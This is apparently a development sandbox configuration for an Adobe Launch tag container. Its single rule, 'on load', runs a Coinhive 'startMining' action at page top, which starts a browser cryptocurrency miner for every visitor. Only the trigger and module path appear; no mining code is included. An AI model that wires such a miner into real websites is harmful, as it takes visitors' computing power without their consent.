module.exports = {
  "dataElements": {},
  "rules": [{
    "id": "RL1557168753004",
    "name": "on load",
    "events": [{
      "modulePath": "sandbox/pageTop.js",
      "settings": {}
    }],
    "actions": [{
      "modulePath": "coinhive/src/lib/actions/startMining.js",
      "settings": {}
    }]
  }],
  "extensions": {},
  "property": {
    "settings": {
      "domains": ["example.com"]
    }
  },
  "company": {
    "orgId": "ABCDEFGHIJKLMNOPQRSTUVWX@AdobeOrg"
  },
  "buildInfo": {
    "turbineVersion": "25.4.1",
    "turbineBuildDate": "2019-05-06T18:52:34.905Z",
    "buildDate": "2019-05-06T18:52:34.905Z",
    "environment": "development"
  }
}